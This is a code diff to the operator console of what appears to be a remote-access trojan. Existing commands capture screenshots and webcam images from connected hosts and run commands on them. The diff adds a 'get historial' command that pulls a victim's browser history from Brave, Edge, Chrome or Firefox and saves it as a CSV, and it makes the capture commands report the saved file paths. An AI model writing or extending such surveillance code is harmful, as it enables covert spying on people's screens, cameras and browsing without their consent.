@@ -67,7 +67,9 @@ class Terminal:
                                 print("Waiting data ...\n")
                                 name = setting.get("path_server").joinpath(name).as_posix()
                                 noerror, mssg = self.__server.screenshot(host, name)
-                                if not noerror:
+                                if noerror:
+                                    print(f"File has been saved as {mssg}")
+                                else:
                                     print(mssg)
 
                             elif task == "camera":
@@ -76,7 +78,9 @@ class Terminal:
                                 print("Waiting data ...\n")
                                 name = setting.get("path_server").joinpath(name).as_posix()
                                 noerror, mssg = self.__server.camera(host, name)
-                                if not noerror:
+                                if noerror:
+                                    print(f"File has been saved as {mssg}")
+                                else:
                                     print(mssg)
 
                             elif task == "cmd":
@@ -95,6 +99,19 @@ class Terminal:
                                         f.write(result)
                                 else:
                                     print(result)
+                            
+                            elif task == "get historial":
+                                browser = flags.get("browser", "edge")
+                                name = flags.get("name", f"historial-{host.name}-{host.id}.csv")
+                                if not name.endswith(".csv"): name += ".csv"
+                                if browser in ("brave", "edge", "chrome", "firefox"):
+                                    noerror, mssg = self.__server.get_browser_historial(host, name, browser)
+                                    if noerror:
+                                        print(f"File has been saved as {mssg}")
+                                    else:
+                                        print(mssg)
+                                else:
+                                    print(f"not support for {browser} browser")
 
                             else:
                                 print("Command not exist")
